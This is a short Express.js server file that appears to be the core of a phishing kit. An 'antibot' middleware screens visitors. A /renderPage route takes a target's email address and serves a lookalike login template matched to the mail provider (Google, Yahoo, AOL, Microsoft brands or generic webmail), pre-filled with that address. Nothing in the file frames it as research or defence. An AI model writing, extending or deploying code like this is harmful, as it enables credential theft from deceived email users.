const express = require('express');
const path = require('path');
const antibot = require('./middleware/antibot');
const app = express();
const port = process.env.PORT || 3000;

// ANTI-BOT 
app.use(antibot);

// Middlewares
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

// SET VIEW EJS ENGINE
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.get('/renderPage', (req, res) => {
    if (!req.query.email) {
        res.status(400).send('No email specified');
        return;
    }

    const email = req.query.email;
    const domain = email.split('@')[1];

    switch (domain) {
        case 'gmail.com':
            res.render('google/index', {email});
            break;
        case 'yahoo.com':
        case 'ymail.com':
            res.render('yahoo/index', {email});
            break;
        case 'aol.com':
            res.render('aol/index', {email});
            break;
        case 'webmail.com':
            res.render('mail/index', {email});
            break;
        case 'outlook.com':
        case 'office.com':
        case 'live.com':
        case 'hotmail.com':
        case 'msn.com':
        case 'windowslive.com':
            res.render('microsoft/index', {email});
            break;
        default:
            res.render('mail/index', {email});
    }
});

// Routes
const router = require('./routers/router');
app.use('/', router);

app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
